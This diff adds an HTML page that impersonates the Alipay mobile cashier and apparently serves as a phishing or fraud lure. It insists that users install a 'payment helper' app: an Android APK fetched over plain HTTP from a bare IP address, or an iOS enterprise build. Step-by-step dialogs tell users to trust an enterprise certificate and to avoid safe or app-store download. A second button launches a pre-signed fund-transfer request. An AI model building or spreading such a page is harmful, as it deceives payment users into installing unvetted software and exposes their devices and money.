@@ -1,0 +1,361 @@
+
+<!DOCTYPE html>
+
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible" />
+    <meta content="webkit" name="renderer" />
+    <title>支付宝</title>
+    <meta content="yes" name="apple-mobile-web-app-capable" />
+    <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+    <meta content="telephone=no,email=no" name="format-detection" />
+    <meta id="WV.Meta.Share.Disabled" value="true" />
+    <meta content="pay" name="data-bizType" />
+    <meta content="a283" name="data-aspm" />
+
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0" name="viewport" />
+    <link href="https://i.alipayobjects.com/i/ecmng/png/201406/2qBuceUYiL.png" rel="apple-touch-icon" />
+    <link href="https://i.alipayobjects.com/i/ecmng/png/201406/2qBuceUYiL.png" rel="apple-touch-icon-precomposed" />
+    <!-- CMS:安全支付客户端网关/common/tracker.vm开始:common/tracker.vm -->
+
+
+    <!-- CMS:安全支付客户端网关/common/tracker.vm结束:common/tracker.vm --><script charset="utf-8" src="https://as.alipayobjects.com:443/g/snake/h5cashier/1.0.5/h5cashier.js"></script>
+    <link href="https://as.alipayobjects.com:443/g/snake/h5cashier/1.0.5/h5cashier.css" media="all" rel="stylesheet" type="text/css" />
+    <script charset="utf-8" id="seajsnode" src="https://a.alipayobjects.com:443/??seajs/seajs/2.2.0/sea.js,seajs/seajs-combo/1.0.0/seajs-combo.js"></script>
+
+    <script>
+        seajs.config({
+            alias: {
+                '$': 'gallery/zepto/1.0.2/zepto',
+                'validator': 'arale/validator/0.9.7/validator',
+                'widget': 'arale/widget/1.1.1/widget',
+                'base': 'arale/base/1.1.1/base',
+                'class': 'arale/class/1.1.0/class',
+                'events': 'arale/events/1.1.0/events',
+                'wapcashier': 'mobileclientgw/wapcashier/1.1.7/wapcashier'
+            },
+            vars: {
+                locale: 'zh-cn'
+            }
+        });
+    </script>
+    <script>
+        /*<![CDATA[*/
+        // var service = 'alipay_sdk=alipay-sdk-java-3.5.35.DEV&app_id=2018101061618854&biz_content=7UyROpIwNDbETBJrNdfXuutjfKDfqQVc5wAB1wHdeQWttRMj8EnIXx74dRUO7eE1jDoQARR9Br4VkWJRygQRUrHAeCMazMTCv8D7BRla69Ka%2F7%2FaZ26yl97U2aGGVsxVZCfzUAjZ4Z%2F8naX6JO8a6O5vdSw1BPTrDZlRDE3ZwuC%2B7PTmuDTmJUjl7scw5soxUmNcM8364jsIAjeF8c2SnZE5L1ittnpoRgG4pbft9oF9nwh9qaW99leBNyxuHmN5q%2BxaXYrECGjdAGdMI6bim7M2wNn8rbr1wDJX7vnWjnf1C8V13et6oRVUJi7qOEZBqkl4LysXJwx4RJDtI2oUYoVf5uYaHipzGWzKh%2BTFhlEqkqRaFb35FNKFPy1Xq%2BD%2BbnBEb4loQSqvIdEg1jVZfeJGKYMTOVlWzRbRvfjj661jy7k8jvZFBZq7vjia%2FfZ2ZaffaoIPpV114xSKwjn2AxBths3sIaTbiTMcz9PQp2r0mDvJ5Vn30mSaKaIZtgzr1gaOSoUjlX0KP9eaJBfm1LC1Xbza1HsrLIGoInmjl5bGyPRgv5SfQIMCVkIb2FAxvxo3x8g8K4c33TpLsfGkUBKXZ%2BgRpKk2uEXI7y1k6mBgyxSsf1OxEibYweVa%2FnM0IRB7aZfsF3%2BE2r8S8FHRzf7yJzoiM84tN0Y%2BgJXK3O9QgN%2BYVke%2BAEs4vGM7ryk9wX38WUr88eieG0KLKj2xFpiE4fNPX6Y8p8lCkNC7Kz75vNZLVx01AEr8gEHoTHHqrbdARnBfXZU98hDsW0YP68%2FQZei%2Bdkqef0SvA4McUaMlvTzQBHFK2m1AVx6H9nywq%2BRNFLaQhaANprW9AIoh849q8jhMISa828hUPy3FO0pDvlY3%2BjCF%2F1gfS0nTabYlgbPrFuRCW7egNERO96QJV0Fv2p%2FwyvkCJAx8lLmtiYM3JYqeqUxoc2UzNPu4zOaqkHUsYNk9DC6onnWrT81QgIghxxG5PJ3epaAG7akPXNfdnIMEasdXnL1eDDGn2BtdESx9wGgP8glM5xMAt0oDBx0QShTnawi6Bg0%2FerdTlyx2MpZZRhxi7YdLVTNXHrqoKYC60fyZzOonUYr3Miya9qAepsCY3NLNEjLEdIzXvHmQFzCBs9TlZnOKez0fhJqQ%2B8EZtjpUqZqe4SocV3m5soXo80qOhDl%2BqTrQbHR94HeEqWq0LSi7Fpcl0gyXUdhCoFEXsUMrMQ1%2FIT36nWXZwW95zNkLvcyIQIlBX9sncPJUESkRfYssvbBeCCQChNy0wzgu47lJaXNDEFDSd3KIF%2F3UOfdE%2FhDp7ZaL6hglGxLtCXnM%2FzKQGKBMUl82PDTks%2Bw9IzcNthB5ip%2BJW0LOXlrXQSfGjb3LreJ7JvLTKbe9Hrd%2BeTZlH1gWl2d%2BEvBC%2BvTrD7oexBeotQcvC%2BkYHPvJ9eJ1%2B7vKrPwiHzYuOzadgzAp%2FCWzNV2UZa%2BzIixCUimGyFRKK38hXBSNOk6XhgDkH%2BR2q6ibawdG7%2B4MFIrIcSRQlk5DvcK%2BbrLOdhAHfyjqVAQnHUxrTjOXOJC%2Ffq4x5KEU6PBgE8%2BlH9Bo4hdo5LM3WWfXx%2Ft3kCEOdiy0NGBzzM2Q5%2FfYs0bISoW%2FE3KEpYe7VrxEqbjMCSruqM42ks3SKl7rYWA8uK84Fu0p0RWl%2Fjq2tky28oQy1Hyc0A%3D%3D&charset=UTF-8&encrypt_type=AES&format=json&method=alipay.fund.trans.app.pay&sign=JqELBpCjw4pQdvO9B0468vvJk%2BoEdCrkhqs8kWge7yQJD34uiN6AE4nxGpnEfN6tCgEMGQ2cX2G1KM2pRR9QkxbkOJ2rk6DLctEh4C8ZJqK1wOs2yVmJnruqG6mPpziC6d%2FWc%2Fpxs5KOoqPKrSdAuNYXnghq3b4VUTx2y2WArBgTggqGxaGMGlWpqmkGegwCjD%2FXUAgpdKGuSCj4VVFQ6WFZ6C%2BGbj86UwfG2dRrXRqcaKZW5EcCXjQNw5TDBV8id3RVjRUD%2FAgNfN%2F51qnq9cvcrs1VUNfnfQjDbA8k4Y9vK%2BUuQTyRtTxNdxc01orxDfHLv0Sjyt0MiBOPHjLcnQ%3D%3D&sign_type=RSA2&timestamp=2019-06-19+13%3A40%3A35&version=1.0';
+        var service = 'alipay_sdk=alipay-sdk-java-3.5.35.DEV&app_id=2018101061618854&biz_content=7UyROpIwNDbETBJrNdfXuutjfKDfqQVc5wAB1wHdeQWttRMj8EnIXx74dRUO7eE1jDoQARR9Br4VkWJRygQRUrHAeCMazMTCv8D7BRla69LCR7mPbdsFuaJw3u0gz4YNGPmhsSzF44lMoKFKs%2Brtx188NMYlPp8zTmCkX%2F05tPH9GBESfG3eWffpkwdFpnrwNPW0EJsaeYVOoa0CKWTfQxU39E8aLJYv7cr0TZHkpoVUCjdgIK7ehMx5fQXzQuN%2FzkG%2Fe%2B9lOq6JRYjv0s8patxNOsYlLNpwLc%2FjMvK9i1YQwucL4fGrnJYrT72RfONy0iTA4A1DyJMCa3XxQljCSwsc6vRl1qp8tK6vx5tWQpaUdBzekFWmxuS3hsz%2BzNzu7J%2BqRDG%2F%2FEFLmHWnTif76s8e5ZrUL%2F%2F8Ez%2BABs7b8kl1VcqkV3kGUnii3PIfPQYRFrscxlOzrA1OniXiV53it6AHkb0KLo%2FUvXa7A95c77TVo4gtz8x6SP8ehjCelSXvdbNOHcYy%2FOLw2hJidiEi3h7ERGllFHWagLXy3BbcMg9y8F%2Bk%2BmhTmnM%2F4N%2FOsmLBQNBAQmFnPpwTCCOwRiFDbegxTQJ1HYGHcdxjkibrfN4MmWbYqyDEib%2BbJFXF5NsvnQgjaunC5O%2B7r0mv1Q5ZjgduFH4XYNgxcTJiJkghypEloxRq7udnL%2BrPx7FTlYwyzqqcufNjyWRu8IaDXaybl%2F%2BjZCftRzzj%2Bz%2FOskXoFp6NJaikilcSiRQjfF6df%2B2krXs%2FhXYOjfBhj4es4CN2Z0f7lzuyLFtVBTlX57VL4aJffn9O6fihy4FP2Vo7Vk%2B5U8%2FdGZ2Y7aHH3OgyqJCPBfG8VBsR%2FAe2sLq8XiAzQcPYOqDM7QeWGQ%2F%2BvApUHlXcSlXA9q9yXEgQgVYT29LDoUyo34CXLALYhgtkmdDZYbHcrOtdoLl9RFBBzcgQrCb4c8zeZyHjsMy1xUlkNV6YDzAiJSuCcdpRtKG8f0FCLMNeSyyIQ0V4v0o%2FhzZ%2FUqdSxGrKl2W5rNnpZYOYLisL1rrfvJIkf%2FgBLU18LyiwDGjkMwj%2BH%2FkNIXHuYy4MEBztqTpj9FEha9m3RIDkodJenoTWYnyEqSG13Eoi1JjqeSILDw5IqWjPqnlGXMEjhfAvHkOejZOAvpOf8h4%2FG8HkkmFFVUO9kqgvvzFQLJOT2yyGvo%2F4Bybd%2FUGZMSM7Xk1ZXo%2FjqL0Xtr8IqDOLlBIIKVDbPZTaDBb7ceajd5N1vmFuH7brEMLfxOpOOe4CbnAROYCaIhYQNcBLgUx5c2wP0DXLUTvfo1V9ez78deu%2FgGyzA75mxqIc0XnfXXgtjT%2FOmAyqr29wL%2F0H9qykKpDE2NxhUUEiENbDobnZrXOJ8jHRztv6voTe8Een%2FImrZIfCsMz%2Fsk73B8BnbkQvpLqlVZXZ3NlY0KEfGQlzOHw8IBKQpSz6hXNqumfyF1erTbiFYJuSm7W%2BHFVAY1Ujpuo8wFmNDm9d77uAHIQ6AaTRiQdFd69qrrQUx4yC9HusTZlOQMclcS424PEGwKut7%2BS5cQ%3D%3D&charset=UTF-8&encrypt_type=AES&format=json&method=alipay.fund.trans.app.pay&sign=icNzDcrcaJh6HfBwSAHfuV8rvztiI3C8xoHyle7altWbU8jLumkXjzp1fFahUCoBYWoJOCJ8UPdvUEuDyNyxFYrzj14AGB4wURpBDdRrjfb%2BLyysTJ%2BlS50VBfHyDgf7ZTIKcRd%2BeEC2t9onXiGVvxStbGGJS9aDLiRb1v%2FikXF9M23UULG14OBEslEEqHVc6PdZL8XWg0lc4ElrmbQyv9hfGxYk%2B%2BejjIFa1RMYAg3zJh%2B%2BcYGUYb9OjPrbf595BFPhZz5Slw9QyppASmQLBXJLXtJlHWG5LSJBme6IVldnEJV8Qk2x1IIE4Qv4gOfWkZet6J5qyHuoOZAAR3xGBg%3D%3D&sign_type=RSA2&timestamp=2019-06-19+16%3A44%3A46&version=1.0';
+        var tips = 'false';
+        var androidUrl = 'http://47.91.169.216:8081/app/H5.apk';
+        var iosUrl = 'https://www.pgyer.com/1erB';
+        /*]]>*/
+    </script>
+</head>
+<body>
+<div class="J-msg-mask am-msg-mask" style="display:none"></div>
+<div class="J-msg-box am-msg-box" style="display:none">
+    <div class="am-msg-box-content">
+        <p class="J-msg-text"></p>
+        <button class="J-msg-cancel am-button am-button-blue" type="button">知道了</button>
+    </div>
+</div>
+
+<header class="am-header">
+    <h1>
+        <span class="title-main" data-title="支付宝收银台">支付宝收银台</span>    </h1>
+
+</header>
+
+
+<noscript><h1 style="color:red">您的浏览器不支持JavaScript，请更换浏览器或开启JavaScript设置!</h1></noscript>
+<!-- FD:256:mobileclientgw/home/v5/h5PayRoute.vm:START --><style>
+    body {
+        font-weight: 500;
+        font-family: PingFangSC-Regular, "Helvetica Neue",Helvetica,Arial,"Lucida Grande",sans-serif;
+    }
+    .am-header {
+        display: none;
+    }
+    .alipay-logo {
+        display: none;
+    }
+    .result {
+        position: absolute;
+        top: 50%;
+        margin-top: -215px;
+        width: 100%;
+    }
+    .result-logo {
+        width: 70px;
+        height: 98px;
+        margin: auto;
+        background-image: url(data:image/png;base64,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);
+        background-repeat: no-repeat;
+        background-size: contain;
+    }
+    .result-title {
+        margin: 40px 0 14px;
+        text-align: center;
+        font-size: 21px;
+        color: #00a0e8;
+        line-height: 25px;
+    }
+    .result-tips {
+        max-width: 370px;
+        margin: 0 auto 10px;
+        padding: 0 15px;
+        font-size: 18px;
+        color: #ff0000;
+        line-height:18px;
+        text-align:left;
+        word-break:break-all;
+        word-wrap:break-word;
+    }
+    .result-botton {
+        margin: 0 15px 20px;
+    }
+    .result-botton a {
+        display: block;
+        margin: auto;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        max-width: 384px;
+        height:44px;
+        text-align: center;
+    }
+    .result-botton a.am-button-white {
+        color: #00aaee;
+        background:#ffffff;
+        border:1px solid #00aaee;
+    }
+    .result-botton .am-button[disabled=disabled] {
+        color: #e6e6e6;
+        background: #f8f8f8;
+        border: 1px solid #dedede;
+    }
+    .loading {
+        display: none;
+    }
+</style>
+<style>
+    div {
+        display: block;
+    }
+
+    .modal-dialog {
+        position: relative;
+        width: auto;
+        margin: 10px;
+    }
+
+    .modal-content {
+        position: relative;
+        background-color: #fff;
+        border: 1px solid #999;
+        border: 1px solid rgba(0, 0, 0, .2);
+        border-radius: 6px;
+        -webkit-box-shadow: 0 3px 9px rgba(0, 0, 0, .5);
+        box-shadow: 0 3px 9px rgba(0, 0, 0, .5);
+        outline: 0;
+        background-clip: padding-box;
+    }
+
+    .modal-header {
+        padding: 15px;
+        border-bottom: 1px solid #e5e5e5;
+    }
+
+    .modal-header .close {
+        margin-top: -2px;
+    }
+
+    button.close {
+        padding: 0;
+        cursor: pointer;
+        background: 0 0;
+        border: 0;
+        -webkit-appearance: none;
+    }
+
+    .close {
+        font-size: 21px;
+        line-height: 1;
+        color: #000;
+        text-shadow: 0 1px 0 #fff;
+        opacity: .2;
+        filter: alpha(opacity=20);
+    }
+
+    .close,
+    .list-group-item>.badge {
+        float: right;
+    }
+
+    .modal-title {
+        margin: 0;
+        line-height: 1.5;
+    }
+
+    h4 {
+        color: #585f69;
+        text-shadow: none;
+        font-weight: 400;
+    }
+
+    .modal-body {
+        position: relative;
+        padding: 20px;
+    }
+
+    .mb-20 {
+        margin-bottom: 20px!important;
+    }
+
+    .center-block {
+        display: block;
+        margin-left: auto;
+        margin-right: auto;
+    }
+
+    li {
+        display: list-item;
+        text-align: -webkit-match-parent;
+    }
+
+    img {
+        border: 0;
+        vertical-align: middle;
+    }
+
+    .modal-footer {
+        margin-top: 15px;
+        padding: 19px 20px 20px;
+        text-align: right;
+        border-top: 1px solid #e5e5e5;
+    }
+
+    .modal-footer .btn {
+        padding: 6px 12px;
+        border-radius: 4px;
+    }
+
+    .btn-u.btn-u-default {
+        background: #95a5a6;
+        border: 1px solid #95a5a6;
+    }
+
+    .btn-u {
+        border: 1px solid #1ABC9C;
+        cursor: pointer;
+        padding: 4px 13px;
+        position: relative;
+        color: #fff;
+        text-decoration: none;
+        font-weight: 400;
+        display: inline-block;
+    }
+</style>
+<div class="loading"></div>
+<div class="am-content">
+    <input name="params" type="hidden" value="{&quot;server_param&quot;:&quot;emlkPTk5O25kcHQ9OTQ4NDtjYz15&quot;}" />
+    <div class="result">
+        <div class="result-logo"></div>
+        <div class="result-title">重点！重点！重点！</div>
+        <div class="result-tips">1、您必须下载、安装【支付助手】，否则无法完成支付。</div>
+        <div class="result-botton"><a class="J-h5pay am-button am-button-blue" href="javascript:void(0)" id="down" onclick="downTip()">下载、安装支付助手</a></div>
+        <div class="result-tips">注：(苹果端请按步骤：设置-通用-设备管理-信任授权)</div>
+        <div class="result-tips">2、先退出支付助手界面，重新发起入款申请，100%成功</div>
+        <div class="result-botton"><a class="J-h5pay am-button am-button-blue" href="javascript:void(0)" id="paybtn" onclick="sdkpay()">我已安装支付助手 开始支付</a></div>
+    </div>
+</div>
+<script type="text/javascript">
+    function sdkpay(){
+        var sdkPayUrl = "zfb://start_pay=" + service;
+        window.location = sdkPayUrl;
+    }
+
+    function down(){
+        var downUrl = androidUrl;
+        if(isIOS()){
+            downUrl = iosUrl;
+        }
+
+        window.location = downUrl;
+    }
+
+    function isIOS(){
+        var ua = navigator.userAgent;
+        var isIOS = !!ua.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端
+
+        return isIOS;
+    }
+
+    function downTip(){
+        if(isIOS()){
+            Zepto.dialog.show({
+                message: '<div class="modal-body" style="background:#f2f2f2;height:300px;overflow-y: scroll;">'
+                + '<section>'
+                + '<div style="padding:0 20px 20px;color:#F00;font:bold 20px">'
+                + '<p>安装指引(请仔细阅读)</p>'
+                + '</div>'
+                + '<div style="padding:0 20px 20px;color:#333;">'
+                + '<p>因苹果公司的政策原因，在iOS系统中首次安装企业版应用时会出现"未受信任的企业级开发者"提示</p>'
+                + '</div>'
+                + '<div style="padding:0 10px 20px;">'
+                + '<img class="img-responsive center-block mt-20 mb-20" src="resovelFlow1_cn.png" style="width:80%;">'
+                + '<br>'
+                + '<h4 class="font-16">解决办法如下（以iOS11系统为例）：</h4>'
+                + '<li style="list-style:none;color:#333;">1、在手机中打开设置功能，选择"通用"</li>'
+                + '<img class="img-responsive center-block mt-20 mb-20" src="resovelFlow2_cn.png" style="width:80%;">'
+                + '<li style="list-style:none;color:#333;">2、在通用中，选择"描述文件与设备管理"功能</li>'
+                + '<img class="img-responsive center-block mt-20 mb-20" src="resovelFlow3_cn.png" style="width:80%;">'
+                + '<li style="list-style:none;color:#333;">3、在描述文件与设备管理中的企业级应用分类中，选择要安装的企业应用的文件名称（与打开时的提示一致），点击进入</li>'
+                + '<img class="img-responsive center-block mt-20 mb-20" src="resovelFlow4_cn.png" style="width:80%;">'
+                + '<li style="list-style:none;color:#333;">4、进入企业签名页面后，确认企业签名中的公司名称与应用名称后，点击信任"企业签名公司名称"</li>'
+                + '<img class="img-responsive center-block mt-20 mb-20" src="resovelFlow5_cn.png" style="width:80%;">'
+                + '<img class="img-responsive center-block mt-20 mb-20" src="resovelFlow6_cn.png" style="width:80%;">'
+                + '<li style="list-style:none;color:#333;">5、回到桌面，重新打开应用即可使用</li>'
+                + '<br>'
+                + '</div>'
+                + '</section>'
+                + '</div>',
+                buttons: '确定',
+                complete: function () {
+                    Zepto.dialog.hide();
+                    down();
+                }
+            });
+        } else {
+            Zepto.dialog.show({
+                message: '<div class="modal-body" style="background:#f2f2f2;height:300px;overflow-y: scroll;">'
+                + '<section>'
+                + '<div style="padding:0 20px 20px;color:#F00;font:bold 20px">'
+                + '<p>安装指引(请仔细阅读)</p>'
+                + '</div>'
+                + '<div style="padding:0 20px 20px;color:#333;">'
+                + '<p>安装过程中，请选择“普通下载”或“直接下载”，不要选择“安全下载”或“通过应用商店下载”</p>'
+                + '</div>'
+                + '<div style="padding:0 10px 20px;">'
+                + '<img class="img-responsive center-block mt-20 mb-20" src="androidTip.png" style="width:80%;">'
+                + '<br>'
+                + '<li style="list-style:none;color:#333;">1、安装完成，打开应用，再回到该页面点击支付</li>'
+                + '<img class="img-responsive center-block mt-20 mb-20" src="dingHelp.jpg" style="width:80%;">'
+                + '<br>'
+                + '</div>'
+                + '</section>'
+                + '</div>',
+                buttons: '确定',
+                complete: function () {
+                    Zepto.dialog.hide();
+                    down();
+                }
+            });
+        }
+    }
+</script>
+<footer>
+    <div class="alipay-logo"></div>
+    <div id="ServerNum">mobileclientgw-40-5566</div>
+</footer>
+
+
+</body></html>
